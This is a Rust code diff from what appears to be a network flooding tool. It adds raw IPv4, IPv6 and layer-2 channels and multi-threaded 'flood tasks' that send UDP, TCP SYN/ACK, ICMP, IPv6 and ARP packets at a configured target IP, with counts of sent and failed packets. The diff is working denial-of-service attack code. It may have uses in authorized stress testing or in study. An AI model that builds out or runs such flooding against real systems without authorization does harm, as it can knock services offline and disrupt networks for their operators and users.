@@ -265,15 +265,50 @@ pub async fn run() {
         }
     }
 
-    // Create transport channel for IP packets (skip in dry-run mode)
-    let tx = if !dry_run {
-        let protocol = transport::TransportChannelType::Layer3(pnet::packet::ip::IpNextHeaderProtocols::Ipv4);
-        let (tx, _) = transport::transport_channel(4096, protocol)
-            .expect("Failed to create transport channel - are you running as root?");
-        Some(Arc::new(Mutex::new(tx)))
+    // Create transport channels (skip in dry-run mode)
+    let (tx_ipv4, tx_ipv6, tx_l2) = if !dry_run {
+        let tx_ipv4 = match transport::transport_channel(
+            4096,
+            transport::TransportChannelType::Layer3(pnet::packet::ip::IpNextHeaderProtocols::Ipv4),
+        ) {
+            Ok((tx, _)) => Some(Arc::new(Mutex::new(tx))),
+            Err(e) => {
+                error!("Failed to create IPv4 transport channel: {}", e);
+                std::process::exit(1);
+            }
+        };
+
+        let tx_ipv6 = match transport::transport_channel(
+            4096,
+            transport::TransportChannelType::Layer3(pnet::packet::ip::IpNextHeaderProtocols::Ipv6),
+        ) {
+            Ok((tx, _)) => Some(Arc::new(Mutex::new(tx))),
+            Err(e) => {
+                error!("Failed to create IPv6 transport channel: {}", e);
+                std::process::exit(1);
+            }
+        };
+
+        let tx_l2 = if let Some(iface) = selected_interface.clone() {
+            match pnet::datalink::channel(&iface, Default::default()) {
+                Ok(pnet::datalink::Channel::Ethernet(tx, _)) => Some(Arc::new(Mutex::new(tx))),
+                Ok(_) => {
+                    error!("Unknown channel type for L2");
+                    std::process::exit(1);
+                }
+                Err(e) => {
+                    error!("Failed to create L2 transport channel: {}", e);
+                    std::process::exit(1);
+                }
+            }
+        } else {
+            None
+        };
+
+        (tx_ipv4, tx_ipv6, tx_l2)
     } else {
         info!("Dry-run mode: Skipping transport channel creation");
-        None
+        (None, None, None)
     };
     let running = Arc::new(AtomicBool::new(true));
     let multi_port_target = Arc::new(MultiPortTarget::new(config.target.ports.clone()));
@@ -348,7 +383,9 @@ pub async fn run() {
     // Spawn flood tasks
     let mut handles = vec![];
     for task_id in 0..config.attack.threads {
-        let tx_clone = tx.clone();
+        let tx_ipv4_clone = tx_ipv4.clone();
+        let tx_ipv6_clone = tx_ipv6.clone();
+        let tx_l2_clone = tx_l2.clone();
         let stats_clone = stats.clone();
         let running_clone = running.clone();
         let multi_port_target_clone = multi_port_target.clone();
@@ -394,20 +431,64 @@ pub async fn run() {
                     }
                 } else {
                     // Real packet sending
-                    if let Some(ref tx_ref) = tx_clone {
-                        let mut tx_guard = tx_ref.lock().await;
-                        match tx_guard.send_to(pnet::packet::ipv4::Ipv4Packet::new(&packet_data).unwrap(), target_ip) {
-                            Ok(_) => {
-                                stats_clone.increment_sent(packet_data.len() as u64, protocol_name);
-                            },
-                            Err(e) => {
-                                if task_id == 0 {
-                                    trace!("Failed to send packet: {}", e);
+                    match packet_type {
+                        PacketType::Udp | PacketType::TcpSyn | PacketType::TcpAck | PacketType::Icmp => {
+                            if let Some(ref tx_ref) = tx_ipv4_clone {
+                                let mut tx_guard = tx_ref.lock().await;
+                                match tx_guard.send_to(pnet::packet::ipv4::Ipv4Packet::new(&packet_data).unwrap(), target_ip) {
+                                    Ok(_) => {
+                                        stats_clone.increment_sent(packet_data.len() as u64, protocol_name);
+                                    },
+                                    Err(e) => {
+                                        if task_id == 0 {
+                                            trace!("Failed to send packet: {}", e);
+                                        }
+                                        stats_clone.increment_failed();
+                                    }
                                 }
-                                stats_clone.increment_failed();
+                                drop(tx_guard);
                             }
                         }
-                        drop(tx_guard);
+                        PacketType::Ipv6Udp | PacketType::Ipv6Tcp | PacketType::Ipv6Icmp => {
+                            if let Some(ref tx_ref) = tx_ipv6_clone {
+                                let mut tx_guard = tx_ref.lock().await;
+                                match tx_guard.send_to(pnet::packet::ipv6::Ipv6Packet::new(&packet_data).unwrap(), target_ip) {
+                                    Ok(_) => {
+                                        stats_clone.increment_sent(packet_data.len() as u64, protocol_name);
+                                    },
+                                    Err(e) => {
+                                        if task_id == 0 {
+                                            trace!("Failed to send packet: {}", e);
+                                        }
+                                        stats_clone.increment_failed();
+                                    }
+                                }
+                                drop(tx_guard);
+                            }
+                        }
+                        PacketType::Arp => {
+                            if let Some(ref tx_ref) = tx_l2_clone {
+                                let mut tx_guard = tx_ref.lock().await;
+                                match tx_guard.send_to(&packet_data, None) {
+                                    Some(Ok(_)) => {
+                                        stats_clone.increment_sent(packet_data.len() as u64, protocol_name);
+                                    },
+                                    Some(Err(e)) => {
+                                        if task_id == 0 {
+                                            trace!("Failed to send packet: {}", e);
+                                        }
+                                        stats_clone.increment_failed();
+                                    }
+                                    None => {
+                                        if task_id == 0 {
+                                            trace!("Failed to send packet: No L2 sender");
+                                        }
+                                        stats_clone.increment_failed();
+                                    }
+                                }
+                                drop(tx_guard);
+                            }
+                        }
                     }
                 }
 
